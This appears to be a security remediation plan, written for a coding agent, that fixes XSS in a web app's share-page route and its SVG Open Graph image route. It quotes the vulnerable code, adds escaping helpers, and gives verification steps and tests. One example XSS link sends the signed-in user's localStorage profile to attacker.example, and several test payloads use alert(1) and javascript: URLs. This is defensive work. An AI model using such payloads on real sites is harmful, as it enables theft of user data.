# Plan 004: Escape all user-controlled values interpolated into the share page and OG image

> **Executor instructions**: Follow this plan step by step. Run every
> verification command and confirm the expected result before moving to the
> next step. If anything in the "STOP conditions" section occurs, stop and
> report — do not improvise. When done, update the status row for this plan
> in `plans/README.md`.
>
> **Drift check (run first)**: `git diff --stat 2477929..HEAD -- src/server.ts`
> If that file changed since this plan was written, compare the "Current state"
> excerpts against the live code before proceeding; on a mismatch, treat it as a
> STOP condition.

## Status

- **Priority**: P1
- **Effort**: S
- **Risk**: LOW
- **Depends on**: `plans/002-establish-verification-baseline.md`
- **Category**: security
- **Planned at**: commit `2477929`, 2026-08-28

## Why this matters

`GET /r/:id` (`src/server.ts:780`) builds an HTML document by string-interpolating two
query parameters — `t` (title) and `a` (author) — with no escaping. They land in a
`<title>` element, in five `content="..."` attributes, and in the page body.

A link like `/r/x?t=</title><script>fetch('https://attacker.example/?c='+localStorage.getItem('kinreader_user'))</script>`
executes attacker JavaScript **on the kinreader.com origin**. That origin is where the
signed-in profile lives (`localStorage.kinreader_user`, written by `src/App.tsx`). This
is a share endpoint, so the delivery mechanism is the feature itself: the victim just
opens a shared link.

`GET /api/og` (`src/server.ts:679`) has the identical defect — `title`, `author`,
`snippet` interpolated into an SVG `foreignObject`, and `image` into an `href`
attribute. It is served as `image/svg+xml`, and an SVG loaded as a top-level document
executes script. `/r/:id` builds the `/api/og` URL, so the two are one code path.

Both are fixed here with one helper. They are in the same file and the same response-
building pattern; splitting them across two plans would mean two conflicting diffs
against `src/server.ts`.

Note: the `X-Frame-Options` and `nosniff` headers set in `src/worker.ts:44-47` do not
help. Neither one stops script execution in a same-origin document.

## Current state

- `src/server.ts:679-777` — `GET /api/og`, returns an SVG built by template literal.
- `src/server.ts:780-820` — `GET /r/:id`, returns an HTML document built by template
  literal.
- `src/worker.ts:36` — routes both `/api` and `/r/` prefixes into `app.handle`, so both
  are reachable in production.

The share route exactly as it exists today. Every `${title}` and `${author}` below is an
injection point:

```ts
// src/server.ts:780-820
  .get('/r/:id', ({ request, params }) => {
    const urlObj = new URL(request.url);
    const id = params.id;
    const title = urlObj.searchParams.get('t') || 'Kinetic Reader Article';
    const author = urlObj.searchParams.get('a') || 'Author';
    const image = urlObj.searchParams.get('img') || '';

    const ogImageUrl = `${urlObj.origin}/api/og?title=${encodeURIComponent(title)}&author=${encodeURIComponent(author)}&image=${encodeURIComponent(image)}`;

    const html = `<!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>${title} • kinreader.com</title>

        <!-- Twitter Card Tags -->
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:site" content="@KineticReaderFM" />
        <meta name="twitter:title" content="${title}" />
        <meta name="twitter:description" content="by ${author} • Listen to this article in 1-line synchronized kinetic typography." />
        <meta name="twitter:image" content="${ogImageUrl}" />

        <!-- OpenGraph Tags -->
        <meta property="og:type" content="article" />
        <meta property="og:title" content="${title}" />
        <meta property="og:description" content="by ${author} • Made to listen on kinreader.com" />
        <meta property="og:image" content="${ogImageUrl}" />
        <meta property="og:url" content="${request.url}" />

        <meta http-equiv="refresh" content="0;url=/?read=${encodeURIComponent(id)}" />
      </head>
      <body style="background:#0d0d14;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;">
        <p>Loading ${title} on kinreader.com...</p>
      </body>
    </html>`;

    return new Response(html, {
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
  });
```

`${request.url}` on the `og:url` line is also attacker-influenced — the full URL
includes the raw query string.

The OG route's injection points, for reference:

```ts
// src/server.ts:685-688
    const cleanTitle = title.length > 70 ? title.slice(0, 67) + '...' : title;
    const cleanSnippet = snippet.length > 55 ? snippet.slice(0, 52) + '...' : snippet;
```

`cleanTitle` is interpolated into a `foreignObject` div, `author.toUpperCase()` into a
`<tspan>`, `cleanSnippet` into a `<text>`, and `image` into `<image href="${image}"...>`.

Repo conventions that apply here:

- Small pure helpers live at the bottom of `src/server.ts`, below the route chain — see
  `round()` at line 822 and `arrayBufferToBase64()` at line 826. Put the escape helper
  there and follow that style: plain `function`, explicit parameter and return types.
- Responses are constructed with `new Response(body, { headers: {...} })`.

## Commands you will need

| Purpose   | Command             | Expected on success |
|-----------|---------------------|---------------------|
| Install   | `bun install`       | exit 0              |
| Typecheck | `bun run typecheck` | exit 0, no output   |
| Tests     | `bun test`          | all pass            |
| Build     | `bun run build`     | exit 0              |

`typecheck` and `test` exist only after plan 002. If they are missing, STOP.

## Scope

**In scope**:
- `src/server.ts` — the `/r/:id` handler, the `/api/og` handler, and one new helper
- `src/server.test.ts` (extend — created by plan 002)

**Out of scope** (do NOT touch, even though they look related):
- The **visual design** of either response. The SVG layout, colours, gradients, fonts
  and the HTML body styling stay byte-for-byte identical for safe input. This is an
  escaping change, not a redesign.
- `src/worker.ts` security headers. Adding a Content-Security-Policy is a reasonable
  follow-up but is a separate, riskier change that can break the SPA; not in this plan.
- The `meta http-equiv="refresh"` redirect behaviour and the `?read=` parameter. The
  fact that `/r/:id` does not actually resolve shared content is a known product gap,
  not a security issue, and is not planned here.
- Any other route in `src/server.ts`. `/api/extract`, `/api/tts` and the auth routes
  return JSON via `JSON.stringify`, which is not vulnerable to this.

## Git workflow

- Branch: `advisor/004-escape-share-page-markup`
- Conventional Commits. Suggested: `fix(security): escape user input in share page and OG image`
- Do NOT push or open a PR unless the operator instructed it.

## Steps

### Step 1: Add the escape helpers

At the bottom of `src/server.ts`, alongside `round()` and `arrayBufferToBase64()`:

```ts
function escapeHtml(input: string): string {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

The `&` replacement must come first — otherwise it double-escapes the entities produced
by the later replacements. This helper is correct for both HTML text nodes and
double-quoted attribute values, and for SVG, which shares XML escaping rules.

For the SVG `href` attribute, escaping alone is not enough — a `javascript:` URL is
script even when perfectly escaped. Add a scheme allowlist:

```ts
function safeImageUrl(input: string): string {
  try {
    const parsed = new URL(input);
    if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') return '';
    return escapeHtml(parsed.toString());
  } catch {
    return '';
  }
}
```

**Verify**: `bun run typecheck` → exit 0, no output.

### Step 2: Escape every interpolation in `/r/:id`

Escape at the point of binding, immediately after reading each parameter, so no
unescaped value can reach the template:

```ts
    const rawTitle = urlObj.searchParams.get('t') || 'Kinetic Reader Article';
    const rawAuthor = urlObj.searchParams.get('a') || 'Author';
    const rawImage = urlObj.searchParams.get('img') || '';

    const title = escapeHtml(rawTitle);
    const author = escapeHtml(rawAuthor);
```

Then, in the template body, three things must change:

1. Every `${title}` and `${author}` now references the escaped locals — no further
   change needed at each site once the bindings above are in place.
2. `ogImageUrl` must be built from the **raw** values, because `encodeURIComponent`
   is the correct encoding for a query string and double-encoding would corrupt the
   displayed text. Build it from `rawTitle` / `rawAuthor` / `rawImage`, then escape the
   whole resulting URL once for attribute context:
   ```ts
   const ogImageUrl = escapeHtml(
     `${urlObj.origin}/api/og?title=${encodeURIComponent(rawTitle)}&author=${encodeURIComponent(rawAuthor)}&image=${encodeURIComponent(rawImage)}`
   );
   ```
3. `${request.url}` on the `og:url` line must become `${escapeHtml(request.url)}`.

**Verify**:
```bash
bun -e 'import("./src/server.ts").then(async ({app}) => {
  const r = await app.handle(new Request("http://localhost/r/x?t=%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E"));
  const body = await r.text();
  console.log(body.includes("<script>alert(1)</script>") ? "VULNERABLE" : "escaped");
})'
```
→ prints `escaped`.

### Step 3: Escape every interpolation in `/api/og`

Apply the same treatment at `src/server.ts:679-777`:

- Escape `cleanTitle`, `author` (after `.toUpperCase()`) and `cleanSnippet` with
  `escapeHtml`.
- Replace `<image href="${image}"` with `<image href="${safeImageUrl(image)}"`, and
  keep the existing `${image ? ... : ...}` conditional — but base the condition on the
  sanitised value so a rejected URL falls through to the placeholder branch:
  ```ts
  const imageHref = safeImageUrl(image);
  ```
  then use `${imageHref ? \`<image href="${imageHref}" .../>\` : \`...placeholder...\`}`.

Escape **after** truncation, not before — truncating an escaped string can cut an
entity in half (`&am`).

**Verify**:
```bash
bun -e 'import("./src/server.ts").then(async ({app}) => {
  const r = await app.handle(new Request("http://localhost/api/og?title=%3Cscript%3Ealert(1)%3C/script%3E&image=javascript:alert(1)"));
  const body = await r.text();
  console.log(body.includes("<script>alert(1)</script>") || body.includes("javascript:") ? "VULNERABLE" : "escaped");
})'
```
→ prints `escaped`.

### Step 4: Confirm safe input renders unchanged

**Verify**: request `/r/x?t=Hello%20World&a=Dan%20Koe` and confirm the body contains
`Hello World` and `Dan Koe` as readable text — escaping must not mangle ordinary
titles. A title containing a genuine apostrophe (`Dan's Article`) should display
correctly in the browser, appearing as `Dan&#39;s Article` in the source.

## Test plan

Extend `src/server.test.ts` (created by plan 002). No new dependencies — these drive
the exported `app` directly with `app.handle(new Request(...))`.

Cases for `/r/:id`:
- `?t=</title><script>alert(1)</script>` → the response body does **not** contain
  `<script>`, and does contain `&lt;script&gt;`.
- `?a="><script>alert(1)</script>` → attribute-breaking payload is escaped; the body
  contains no unescaped `">` sequence inside a `content` attribute.
- `?t=Hello World` → body contains `Hello World` (the safe-input regression).
- `?t=Dan's Article` → body contains `Dan&#39;s Article`.

Cases for `/api/og`:
- `?title=<script>alert(1)</script>` → no `<script>` in the body.
- `?image=javascript:alert(1)` → body contains no `javascript:`.
- `?image=https://example.com/a.png` → body contains that URL in an `href`.

Model the file structure on the existing cases plan 002 added to `src/server.test.ts`.

Verification: `bun test` → all pass, including at least 7 new cases.

## Done criteria

Machine-checkable. ALL must hold:

- [ ] `bun run typecheck` exits 0 with no output
- [ ] `bun test` exits 0, including all new XSS cases
- [ ] `grep -c "function escapeHtml" src/server.ts` returns `1`
- [ ] Both Step 2 and Step 3 verification snippets print `escaped`
- [ ] `bun run build` exits 0
- [ ] `git status --short` shows only `src/server.ts` and `src/server.test.ts` modified
- [ ] `plans/README.md` status row for 004 updated

## STOP conditions

Stop and report back (do not improvise) if:

- The `/r/:id` or `/api/og` handler no longer matches the "Current state" excerpts.
- A verification snippet still prints `VULNERABLE` after two fix attempts. Report the
  actual response body — a partial escape is worse than none, because it looks fixed.
- You conclude the fix requires changing the visual output for safe input. It does not;
  report what you are seeing instead.
- You find a third route in `src/server.ts` interpolating user input into markup. Report
  it — it is a new finding, not covered by this plan's scope or tests.
- Escaping appears to break the Twitter/OpenGraph card preview for legitimate titles.
  Report it before reverting; the likely cause is double-escaping `ogImageUrl`, which
  Step 2 point 2 exists to prevent.

## Maintenance notes

- The rule this establishes: **anything read from `searchParams` or `request.url` that
  reaches a `text/html` or `image/svg+xml` response must pass through `escapeHtml`
  first**, and any URL reaching an `href` must pass through `safeImageUrl`. A reviewer
  should check any future markup-returning route against that rule.
- A reviewer should specifically confirm `ogImageUrl` is built from raw values and
  escaped once — that is the one place where a well-meaning "escape everything at the
  top" refactor produces visibly corrupted card previews.
- Deferred out of this plan: no Content-Security-Policy is set on these responses. A CSP
  with `script-src 'none'` on `/r/:id` and `/api/og` would be defence in depth, but it
  needs testing against the SPA's own asset loading and belongs in its own change.
- Deferred: `/r/:id` still cannot actually resolve a shared article — `id` only becomes
  `?read=` and nothing consumes it. Worth planning as a product fix.
